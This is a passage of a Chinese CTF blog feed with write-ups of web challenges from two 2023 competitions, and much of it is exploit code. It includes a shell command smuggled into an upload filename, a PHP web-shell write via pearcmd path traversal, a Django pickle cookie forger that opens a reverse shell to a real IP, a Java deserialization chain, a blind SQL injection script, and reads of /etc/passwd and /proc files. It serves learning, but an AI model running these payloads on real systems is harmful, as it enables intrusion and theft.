class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;;echo bHMgLwo|base64 -d|bash;ajpg.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary5zDlxzonrJYj4N0m--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功后</p><p><img src="../images/image-20230726145658481.png" alt="image-20230726145658481"></p><p>通过<code>get</code>传参       <strong><code>?file=上传的文件名字</code></strong></p><p><img src="../images/image-20230726145829047.png" alt="image-20230726145829047"></p><p>成功拿到flag名字  之后修改这个文件名就能拿到flag了</p><h3 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="phar文件上传"></a>phar文件上传</h3><p>先生成一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>然后上传图片  (<strong>修改后缀上传</strong>)</p><p><img src="../images/image-20230726153903059.png" alt="image-20230726153903059"></p><p>这里的话是<code>md5_file</code>来触发的</p><p><img src="../images/image-20230726153925874.png" alt="image-20230726153925874"></p><p>如果不填<code>todo=md5</code>的话  是不能触发的</p><p>(<strong>我也不知道为啥。。。。。。。。</strong>)</p><p><img src="../images/image-20230726162917937.png" alt="image-20230726162917937"></p><p><strong>按道理来说的话  在构造函数这里的时候已经触发这个<code>phar</code>了</strong></p><p><strong>解决了这个问题了</strong></p><p> 原因就是因为传进来的值会有<code>/</code>     然后就会进入正则  抛出异常</p><p><img src="../images/image-20230729003235802.png" alt="image-20230729003235802"></p><p>还是自己蠢了   tmd</p><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><p>这题真狗  </p><p>但是尝试<strong>pearcmd</strong>没写入成功(当时<code>pearcmd.php</code>位置错了 没发现)</p><p>然后尝试sql写入半天  还是没成功</p><p>最后又返回来用<code>pearcmd</code>写入才成功  (发现了位置不对后才成功)</p><p><a href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Y4—熊海CMS代码审计</a></p><p>看这篇文章就行了</p><p><img src="../images/image-20230726164436791.png" alt="image-20230726164436791"></p><p>就是这里</p><p><strong>如果访问默认的<code>pearcmd.php</code>路径的话   这个题目是访问不到的</strong></p><p><img src="../images/image-20230726171220938.png" alt="image-20230726171220938"></p><p>问下<code>gpt</code>之后  发现了<code>/usr/share/php</code>这个位置  尝试之后发现成功了</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?+config-create+/&amp;r=../../../../../../../../../usr/share/php/pearcmd&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726172057819.png" alt="image-20230726172057819"></p><p>然后进行文件包含</p><p><img src="../images/image-20230726172316775.png" alt="image-20230726172316775"></p><p><strong>成功写入</strong></p><p>然后直接RCE就行了</p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>这道题是参考这个 <a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%A2%AB%E6%B3%84%E6%BC%8F%E7%9A%84%E5%A7%9C%E6%88%88/README.md">hackergame2019</a>  出的题</p><p>这题考察得是<code>django</code>的<code>RCE</code></p><p><strong>拿到源码之后</strong></p><p>主要看里面的<code>settings.py</code>  这个文件</p><p><img src="../images/image-20230729154657238.png" alt="image-20230729154657238"></p><p><img src="../images/image-20230729154708124.png" alt="image-20230729154708124"></p><p>这里的话提供了<code>SECRET_KEY</code>   并且对<code>session</code>是进行<code>Pickle</code>反序列化解析的</p><p>通过这里的话我们就很清晰能得知可以通过伪造<code>session</code>来进行反序列化的</p><p><strong>并且在其官方文档里也提到了这个问题</strong></p><p><img src="../images/image-20230729154935067.png" alt="image-20230729154935067"></p><p><a href="https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/en/2.2/topics/http/sessions/#using-cookie-based-sessions</a></p><p>然后我们就去搜索这几个关键字  得到一篇文章  并且是有poc的</p><p><img src="../images/image-20230729155304243.png" alt="image-20230729155304243"></p><p>题目给我们的附件中  可以看到<code>django</code>的版本</p><p><img src="../images/image-20230729155402295.png" alt="image-20230729155402295"></p><p><img src="../images/image-20230729155428512.png" alt="image-20230729155428512"></p><p>其实默认采用的是<code>json</code>的序列化   但是为了出题  作者将其改为了<code>pickle</code>序列化</p><p><img src="../images/image-20230729155759379.png" alt="image-20230729155759379"></p><p>本来实际上是这样的  但是并不影响我们自己修改成Pickle</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django.core.signing</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PickleSerializer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dumps</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/3389 &lt;&amp;1&quot;&#x27;</span>,),-<span class="number">1</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">False</span>, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">out_cookie= django.core.signing.dumps(</span><br><span class="line">    Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)</span><br><span class="line"><span class="built_in">print</span>(out_cookie)</span><br></pre></td></tr></table></figure><p>这里的话是先进行登录  然后将<code>cookie</code>修改为我们构造的  然后访问<code>auth</code>路由就行了</p><p>但是我这里没弹成功  不知道是<code>payload</code>的问题还是我的操作问题</p><h2 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h2><p>这道题考察的是http2</p><p><strong>确实符合题目说的一种很新的方式</strong></p><p>这里的话是参考github上这个出的题目  几乎一模一样</p><p><a href="https://github.com/ConnorNelson/spaceless-spacing">http2</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&amp;mid=2247484933&amp;idx=1&amp;sn=60ae6e59096e22a2b60bb7ba4e80ce04&amp;chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&amp;mpshare=1&amp;scene=23&amp;srcid=072376b235QJm9tNCYWMZFQU&amp;sharer_sharetime=1690091289890&amp;sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">这个wp中也写了这个题目的wp</a></p><p>好像这个题目的地址关了  所以我就没做了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EzFlask&quot;&gt;&lt;a href=&quot;#EzFlask&quot; class=&quot;headerlink&quot; title=&quot;EzFlask&quot;&gt;&lt;/a&gt;EzFlask&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://tttang.com/archive/1876/#toc_obje</summary>
      
    
    
    
    
    <category term="DASCTF 2023 &amp; 0X401-Web" scheme="https://ke1nys.github.io/tags/DASCTF-2023-0X401-Web/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2023-Web</title>
    <link href="https://ke1nys.github.io/posts/7d1902a5.html"/>
    <id>https://ke1nys.github.io/posts/7d1902a5.html</id>
    <published>2023-07-21T08:52:15.000Z</published>
    <updated>2023-07-29T08:13:42.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p><strong>审计代码得出一个思路</strong></p><p>就是在反序列化的时候会将得到的内容写入到  <code>/tmp/file</code>下</p><p>然后在<code>/file</code>下就可以读取到内容</p><p><img src="../images/image-20230721165726299.png" alt="image-20230721165726299"></p><p>题目把这个有反序列化入口的类给ban了  </p><p>这里的话就可以容易想到二次反序列化绕过</p><p>刚好就可以想到<code>SignedObject</code>这个jdk自带的类  </p><p>查看依赖发现没有什么特别的类可以用   于是就想到之前阿里云ctf里用过的<code>JackSon</code>这个类</p><p>刚好可以触发getter  </p><p>于是得出利用了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException</span><br><span class="line">POJONode</span><br><span class="line">SignedObject</span><br></pre></td></tr></table></figure><p>所以最终的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.util.MyObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;File:///F14gIsHereY0UGOTIT&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        handler.visiter = urlVisiter;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(handler,privateKey,signingEngine);</span><br><span class="line">        <span class="comment">//这个SignedObject传进来就是要反序列化的类</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="comment">//这里就是使用POJONode这个可以触发任意getter的方法 ----&gt;  来触发这个signedObject里的getObject()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">o</span> <span class="operator">=</span> (URLHelper)ois.readObject();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>通过这道题的话学到了一些新东西</strong></p><p><img src="../images/image-20230724101125766.png" alt="image-20230724101125766"></p><p>这道题的话其实也可以利用<code>netdoc</code>这个协议来读取文件内容   </p><p>(可以当作<code>file</code>协议的替代品)</p><h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>这里的话先是fuzz了一下  发现<strong>sleep benchmark rpad if count</strong> 都过滤了</p><p>然后在页面尝试测试了一下   猜测是个<strong>sql盲注</strong></p><p>(所以就猜测是用<strong>笛卡尔乘积</strong>)    </p><p>这里的话却不能使用这个常规的  (因为<code>count</code>和<code>if</code>都被ban了)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)a,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns)b,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns limit <span class="number">1</span>,<span class="number">7</span>)c) limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>当时因为懒 没深究这个  看别的题去了  导致没做出来。。。。。。。</p><p><strong>直接问gpt</strong></p><p><img src="../images/image-20230724104909369.png" alt="image-20230724104909369"></p><p><img src="../images/image-20230724105015874.png" alt="image-20230724105015874"></p><p><strong>直接让gpt来帮我们在原来的基础上进行修改</strong></p><p><img src="../images/image-20230724105451643.png" alt="image-20230724105451643"> </p><p><img src="../images/image-20230724105521195.png" alt="image-20230724105521195"></p><p>可以成功进行延时</p><p><strong>最终的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            burp0_url = <span class="string">&quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot;</span> \</span><br><span class="line">                        <span class="string">&quot;substr(group_concat(table_name),&#123;&#125;,1)) from information_schema.tables where table_schema=database()))=&#123;&#125; then (select sum(1) FROM &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot;</span> \</span><br><span class="line">                        <span class="string">&quot;information_schema.views D) else 1 end-- -&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">                <span class="comment">#Flllag</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(column_name),&#123;&#125;,1)) from information_schema.columns where table_name=&#x27;Flllag&#x27;))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line">                <span class="comment">#Flagg</span></span><br><span class="line">            <span class="comment"># burp0_url = &quot;http://web-c456af9c06.challenge.xctf.org.cn/index.php?id=1&#x27; and case when ((select ascii(&quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;substr(group_concat(Flagg),&#123;&#125;,1)) from Flllag))=&#123;&#125; then (select sum(1) FROM &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.tables A, information_schema.columns B, information_schema.tables C, &quot; \</span></span><br><span class="line">            <span class="comment">#             &quot;information_schema.views D) else 1 end-- -&quot;.format(i, j)</span></span><br><span class="line"></span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            r = requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            <span class="comment"># print(j,r.text)</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;kfrL9n0upSAOMvY8hcO8uLdYMo9mZjHY&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230724110506033.png" alt="image-20230724110506033"></p><p>这里解释一下这个<code>case when condition then result</code>  的意思</p><p>就是当<strong>查询内容</strong>满足这个<code>condition</code>的时候就会返回<code>result</code> </p><p><strong>上述代码的意思就是说匹配到的时候就会延时</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>其实就是考察的是<strong>时间盲注</strong>  但是只是需要替换一些函数</li></ul><h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p>这道题预期解其实是挺复杂的  但是这题存在非预期  (<strong>原因是出题人在运行完sh文件后没把该文件删除  导致出现了非预期)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目提示了 </span><br><span class="line">访问/hinder</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230725111811018.png" alt="image-20230725111811018"></p><p>没访问之前是可以看到这个网站的服务器是<code>java</code>的    (<strong>是个挺重要的信息</strong>)</p><p><img src="../images/image-20230725112023678.png" alt="image-20230725112023678"></p><p>这里话是有两个绕过方法</p><ul><li>一个是url编码  (<strong>因为这里是前端校验</strong>)</li><li>另一个是使用    <code>/;/hinder</code></li><li><code>/anything/../hinder/</code> <strong>绕过路径 (这样也行)</strong></li></ul><p><img src="../images/image-20230725112140700.png" alt="image-20230725112140700"></p><p>这里的话讲一下这个  <code>/;/hinder</code>  绕过的原理</p><p><img src="../images/image-20230725112306230.png" alt="image-20230725112306230"></p><p><img src="../images/image-20230725112342291.png" alt="image-20230725112342291"></p><p>其实这里的话就是实现任意文件读取了   (<strong>看到这个<code>action</code>的时候其实可以想到这个<code>struct2</code></strong>)</p><p>尝试读取一下<code>/etc/passwd</code></p><p><img src="../images/image-20230725113456496.png" alt="image-20230725113456496"></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a><strong>非预期解</strong></h3><p>尝试读取出题人常用的docker启动脚本   <strong>例如 <code>/run.sh  /start.sh</code></strong></p><p><img src="../images/1689930726240-f021d0b4-1312-46c6-8638-1a3398dd542f.png" alt="img"></p><p>然后读取该文件就行了 </p><p><img src="../images/1689930751274-96d92ed6-3259-4bcd-bdda-dc7be9aea343.png" alt="img"></p><p><strong>看到这些非预期解以后   以后读取文件的话可以尝试读取这两个地方的东西了</strong></p><ul><li><code>/proc/1/environ</code></li><li><code>/proc/1/cmdline</code></li><li><code>/run.sh  /start.sh 等等之类的docker启动常用脚本</code></li></ul><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><a href="https://www.yuque.com/dat0u/ctf/vl4hurp3yvqqsckz#BPCx1">巅峰极客2023 hinder</a></p><p>这个是使用的是<code>struct2</code>的漏洞来解的题</p><p>这里还没有一个完整的wp来看   所以先不写</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><strong>unserialize</strong></h2><p><strong>启动脚本</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; lxxxin/dfjk2023_unserialize</span></span><br></pre></td></tr></table></figure><p>访问  <code>/www.zip</code>  得到源码</p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span 